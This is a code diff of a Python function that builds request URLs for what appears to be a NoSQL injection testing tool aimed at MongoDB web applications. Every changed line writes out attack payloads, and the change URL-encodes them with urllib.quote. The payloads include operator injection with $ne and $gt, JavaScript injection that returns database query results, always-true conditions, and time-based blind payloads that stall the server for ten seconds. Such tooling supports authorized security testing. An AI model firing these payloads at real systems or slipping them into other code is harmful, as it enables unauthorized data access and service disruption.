@@ -915,24 +915,24 @@ def buildUri(origUri, randValue):
         if paramName[x] in injOpt:
             uriArray[0] += paramName[x] + "=" + randValue + "&"
             uriArray[1] += paramName[x] + "[$ne]=" + randValue + "&"
-            uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
-            uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
-            uriArray[4] += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
-            uriArray[5] += paramName[x] + "=1; return db.a.findOne(); var dummy=1" + "&"
-            uriArray[6] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
-            uriArray[7] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
+            uriArray[2] += paramName[x] + "=" + urllib.quote("a'; return db.a.find(); var dummy='!") + "&"
+            uriArray[3] += paramName[x] + "=" + urllib.quote("1; return db.a.find(); var dummy=1") + "&"
+            uriArray[4] += paramName[x] + "=" + urllib.quote("a'; return db.a.findOne(); var dummy='!") + "&"
+            uriArray[5] += paramName[x] + "=" + urllib.quote("1; return db.a.findOne(); var dummy=1") + "&"
+            uriArray[6] += paramName[x] + "=" + urllib.quote("a'; return this.a != '" + randValue + "'; var dummy='!") + "&"
+            uriArray[7] += paramName[x] + "=" + urllib.quote("1; return this.a !=" + randValue + "; var dummy=1") + "&"
             uriArray[8] += paramName[x] + "[$gt]=&"
-            uriArray[9] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
-            uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy='!" + "&"
-            uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
-            uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
-            uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
-            uriArray[14] += paramName[x] + "a'; return true; var dum='a"
+            uriArray[9] += paramName[x] + "=" + urllib.quote("1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1") + "&"
+            uriArray[10] += paramName[x] + "=" + urllib.quote("a\"; return db.a.find(); var dummy='!") + "&"
+            uriArray[11] += paramName[x] + "=" + urllib.quote("a\"; return this.a != '" + randValue + "'; var dummy='!") + "&"
+            uriArray[12] += paramName[x] + "=" + urllib.quote("a\"; return db.a.findOne(); var dummy=\"!") + "&"
+            uriArray[13] += paramName[x] + "=" + urllib.quote("a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!") + "&"
+            uriArray[14] += paramName[x] + urllib.quote("a'; return true; var dum='a")
             uriArray[15] += paramName[x] + "1; return true; var dum=2"
             #Add values that can be manipulated for database attacks
-            uriArray[16] += paramName[x] + "=a\'; ---"
+            uriArray[16] += paramName[x] + "=" + urllib.quote("a\'; ---")
             uriArray[17] += paramName[x] + "=1; if ---"
-            uriArray[18] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
+            uriArray[18] += paramName[x] + "=" + urllib.quote("a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!") + "&"
 
         else:
             uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
